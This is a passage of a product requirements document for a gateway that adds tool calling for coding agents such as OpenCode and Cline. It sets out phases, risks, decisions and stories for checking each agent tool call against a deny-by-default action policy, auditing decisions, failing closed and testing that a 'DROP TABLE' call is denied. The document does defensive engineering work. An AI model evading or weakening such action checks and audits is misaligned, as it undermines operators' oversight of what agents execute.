**Deliverables:** client survey (OpenCode 2.0.10, Cline CLI) with corrections to PRD-016's mappings if they drifted; settings and flag; `Message` / `ToolCallSpec` and the normalizer.
**Validation:** every existing test green; mapping corrections land as data in `action_config`.

### Phase 2 — The pipeline accepts tools (Stories 4–8)
**Goal:** tool turns and tools flow client → pipeline → upstream under every existing policy.
**Deliverables:** upstream client widening; step 0 and the audit anchor; the dedup key; steps 3/5/6 for tool content; `/v1` request translation under the flag, passed through to step 7.
**Validation:** per-step unit tests; flag-off regressions unchanged.

### Phase 3 — Decide and release (Stories 9–12)
**Goal:** every call decided, recorded and shaped.
**Deliverables:** `tool_release`; step 7c with `record()` and fail-closed; the completion and SSE shapes; `GET /audit/actions?audit_id=` and the console copy.
**Validation:** the brief's in-process criteria suite green.

### Phase 4 — Real clients and docs (Stories 13–17)
**Goal:** OpenCode and Cline work; operators can set it up.
**Deliverables:** stub upstream tool scripts; in-process criteria suite and latency; OpenCode and Cline E2E; README, `docs/features.md`, roadmap, `.env.example`, brief promoted.
**Validation:** E2E reports; full suite green.

## 13. Future Considerations

- **Real streaming** with incremental action evaluation (a call can only be decided once its arguments are complete, so text could stream and calls be buffered).
- **Re-evaluating history calls** for clients that execute calls they were never sent (they cannot through the harness, but a mixed deployment might).
- **MCP hosting** (roadmap), with the harness as the MCP server's front door.
- **Tool schema inspection** for injection in `description` fields.
- **Per-client policy presets** shipped as examples (`examples/action_policy.cline.yaml`).
- **A `has_denied_actions` summary column** on `audit_logs` if the Register needs a filter (PRD-016 D8 left it open).

## 14. Risks & Mitigations

| # | Risk | Likelihood / Impact | Mitigation |
|---|---|---|---|
| 1 | **Agents mishandle partial responses** (a dropped call, a note in content) | Medium / Medium | E2E per client asserts the agent continues after a denial and prints the reason; D1/D2 revisited with the E2E data and Actions-view data |
| 2 | **Buffered tool-call deltas confuse a client** expecting many fragments | Low / High | One complete fragment per index is spec-valid; verified per client in E2E and with the OpenAI SDK accumulator in-process |
| 3 | **Client tool names drifted** since PRD-016's survey (OpenCode 1.19.5 → 2.0.10) | Medium / High | STORY-001 re-surveys before any wiring; a drifted name is `tool.unknown` (deny), never a bypass; corrections land as data |
| 4 | **Over-blocking stalls agents** (absolute paths outside an unset workspace root, `shell.allow` empty for Cline) | High / Medium | Setup docs and E2E policy files set roots and `shell.allow`; `flag` for rollout (PRD-016 D10) |
| 5 | **Dedup key change resets windows** | Low / Medium | Tool-free keys pinned unchanged by test |
| 6 | **Enabling tools before the policy is configured** | Medium / High | Flag default off; deny-by-default built-in policy; docs order the steps |
| 7 | **Cline CLI cannot be driven headlessly against a custom base URL** | Medium / Medium | STORY-001 decides the harness for it (CLI flags, config file, or the VS Code extension's request shapes replayed); the E2E story records the limit if a full run is impossible |

## 15. Appendix

### Source
- Pre-PRD brief: [pre-prds/PRE-PRD-016-tool-calling.md](../../../pre-prds/PRE-PRD-016-tool-calling.md)
- Track overview: [pre-prds/README.md](../../../pre-prds/README.md). Depends on PRD-015 and PRD-016 (both done and merged); blocks nothing.

### Decisions

| # | Question | Decision |
|---|---|---|
| D1 | One denied call among several | **Deny only that call**; release the others. As proposed |
| D2 | Denial shape | **Drop the call, append an assistant note with the reason**; `finish_reason` stays `tool_calls` if any call remains, else `stop`. As proposed; template in Section 6.6 |
| D3 | Models without tool support | **`V1_TOOL_MODELS`**, a request-time 400 (see D16 for the deviation from "at `/v1/models` level") |
| D4 | Dedup on `tool` turns | **Never the anchor; in the prefix hash**, anchor position marked, tool-free keys unchanged. As proposed, made exact in Section 6.4 |
| D5 | *(new)* How `Message` carries tools | Two defaulted fields and `ToolCallSpec`; arguments stay the raw string |
| D6 | *(new)* Conversation shape | Last turn `user` or `tool`; a `tool` turn answers a call of the nearest preceding assistant `tool_calls` turn, once (Section 6.3) |
| D7 | *(new)* The audit row's `prompt` when the last turn is `tool` | **The final turn**, user or tool: it is what this request added. Its PII entities are the row's |
| D8 | *(new)* `record()` fails | **Fail closed**: 500 `internal_error` (retryable, PRD-015 D7's storage rule), nothing released; an `ERROR` log names the user and `audit_id`. *Orchestrator decision (STORY-010 plan):* the success row is written before `record()` (it needs the row's id), so the pipeline then marks that row `success=0` with `error_message='action audit failed'`, best effort, so the retry is not held as a duplicate (`find_duplicate_timestamp` counts only `success=1`). If that update fails too, the log says so and the 24-hour duplicate window holds the retry |
| D9 | *(new)* `flag` | Released and recorded (PRD-016 D10); visible in `harness.actions` |
| D10 | *(new)* Flag off; legacy API | Off is PRD-015 byte for byte; `functions`/`function_call` refused always |
| D11 | *(new)* `parallel_tool_calls` | **Forwarded** when tools are on (a parameter that changes what the caller gets is not silently dropped, PRD-015 principle); ignored and recorded as today when off |
| D12 | *(new)* Context limit | Arguments count toward `CONTEXT_MAX_CHARACTERS` |
| D13 | *(new)* Patterns and PII on arguments | Neither inspects nor redacts arguments; `tool` **content** gets both (Section 6.5) |
| D14 | *(new)* Telling the client what was decided | `harness.actions` on the non-streamed body; notes in content for every client |
| D15 | *(new)* E2E upstream | **The stub upstream with scripted tool calls**, as PRD-015's E2E; a live-model run is optional and documented, not a gate |
| D16 | *(new, deviation)* Where D3's capability lives | A setting checked per request, not a field on `GET /v1/models`: the OpenAI model object has no capability field, and neither client reads one (they configure capabilities client-side) |
| D17 | *(new)* `/query` and the chat UI | Unchanged; they never send `tools` |
| D18 | *(new)* Upstream `tool_calls` without `tools` sent | Still `OpenRouterError` (today's message) |
| D19 | *(new)* `has_tool_calls` | 1 when the request carries an assistant `tool_calls` or a `tool` turn, or the upstream response carried calls (before release) |

### Evidence (verified against `main` @ `0bc5774`)
- `app/services/v1_translate.py:102-113`: `tools`, `functions`, `tool_choice`, `function_call` in `REJECTED_UNLESS_DEFAULT` → `TOOLS_NOT_SUPPORTED`; `:216-223` refuse `tool_calls` / `function_call` in a message and the `tool` role; `:235` last turn must be `user`.
- `app/services/openrouter_client.py:252`: payload messages are `{"role", "content"}` only; `:280` reads `message["content"]`; `:286-291` `None` content raises, with `"; tool calls are not supported (PRD-017)"` when `tool_calls` is present.
- `app/models/messages.py:16`: `Role` already includes `tool`; `:75-76` refuses `tool_calls`.
- `app/services/query_pipeline.py:69-75`: `_validate_conversation` refuses `tool` turns and a non-`user` last turn; `:284` `prompt = messages[-1].content`; `:665-697` step 7; `:699-724` step 7b; `:766-792` the success row with `has_tool_calls=False`.
- `app/services/duplicate_checker.py:492,500-512`: `_KEYED_ROLES` excludes `tool`; `dedup_key` raises for it and keys on a final `user` turn.
- `app/services/pii_policy.py:130`: `code` covers `{"user", "assistant", "tool"}`; `app/services/pattern_config.py:249`: `code` roles `{"user": "block", "assistant": "flag", "tool": "flag"}`.
- `app/services/action_policy.py:343-360`: `evaluate_all(calls, identity, policy=None)`; `app/services/action_audit.py:172-188`: `record(decisions, identity, audit_id=None, session_id=None)`, no catch.
- `app/models/v1_schemas.py:83` `FinishReason` has no `tool_calls`; `:100-102` `AssistantMessage.content: str`; `:134-142` `ChunkDelta` has role and content only.
- `app/services/v1_sse.py:362-387`: one content chunk, one finish chunk, usage, `[DONE]`.
- `chat_ui/chat_ui/admin_copy.py:332-338`: the Actions empty-state copy names PRD-017.
- `scripts/stub_openrouter.py`: rules match the last `user` message only; replies carry `content` only.
- `opencode --version` on the dev machine: `2.0.10`; Cline is not installed.

### Story breakdown (generated by `/create-stories`; files under `.agents/stories/PRD-017-tool-calling/`)
1. STORY-001 Client survey: OpenCode 2.0.10 and Cline request/response shapes; PRD-016 mappings re-verified (Risks 3, 7)
2. STORY-002 `V1_TOOLS_ENABLED`, `V1_TOOL_MODELS` settings and validators (D3, D10, D16)
3. STORY-003 `ToolCallSpec`, `Message.tool_calls` / `tool_call_id`, normalizer (D5)
4. STORY-004 Upstream client: `ToolParams`, tool message serialization, `tool_calls` parsing (D11, D18)
5. STORY-005 Step 0 under the D6 shape rules; the audit prompt is the final turn (D6, D7)
6. STORY-006 `dedup_key` over tool turns (D4)
7. STORY-007 Steps 3, 5, 6 for tool content; arguments untouched (D12, D13)
8. STORY-008 `/v1` request translation under the flag, passed through to step 7 (D6, D10, D11, D16)
9. STORY-009 `tool_release.apply_decisions` (D1, D2, D9)
10. STORY-010 Step 7c: evaluation, release, `record()` with `audit_id`, fail closed, `has_tool_calls` (D8, D19)
11. STORY-011 Completion shape: `tool_calls`, `content: null`, `finish_reason`, `harness.actions` (D14)
12. STORY-012 Buffered SSE `tool_calls` deltas (Risk 2)
13. STORY-013 `GET /audit/actions?audit_id=` and the Actions empty-state copy
14. STORY-014 Stub upstream: scripted tool calls, match on any last turn
15. STORY-015 In-process success-criteria suite and step 7c latency
16. STORY-016 E2E: OpenCode multi-file task and denied `DROP TABLE`
17. STORY-017 E2E: Cline
18. STORY-018 README, `docs/features.md`, `docs/roadmap.md`, `.env.example`; brief promotion verified

### Related documents
- PRD-009 (duplicates): D4 left `tool` turns to this PRD
- PRD-010 (multi-turn): `Message`, step 0, D7 (only the last turn's PII counts)
- PRD-011 (patterns): the `tool` cell, D4 (`tool: flag` until data)
- PRD-012 (PII for code): Section 6.5's "tool-call arguments are never redacted" contract; `code` covers `tool`
- PRD-013 (audit): `has_tool_calls`, the usage charge at 7b
- PRD-015 (endpoint): the refusals this PRD lifts, the buffered stream (D8), the error table, the stub upstream
- PRD-016 (action policy): the engine, the audit, D10 (`flag` never blocks), T11 (safe reasons)

### Dependencies
- Depends on: PRD-015 (done), PRD-016 (done)
- Blocks: none

**Skills referenced:** frontend-design — applies to STORY-013 only (the Actions view's empty-state copy). Its rule "Build with the brief's real content and subject matter throughout" is why the new copy names what the view now holds (decisions on live `/v1` tool calls) rather than generic filler. No rule from it applies to Sections 6, 8 or 9.
